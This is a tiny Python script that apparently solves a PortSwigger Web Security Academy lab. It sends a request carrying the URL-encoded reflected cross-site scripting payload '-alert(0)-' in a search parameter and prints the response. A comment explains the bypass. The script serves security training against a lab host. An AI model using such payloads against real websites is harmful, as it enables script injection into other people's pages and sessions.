import requests

url = "https://0af00033030aa2b5c211449200af004b.web-security-academy.net/?search=%27-alert%280%29-%27"
solution = requests.get(url)
print(solution.content)

#explain: bypass via payload -alert(0)-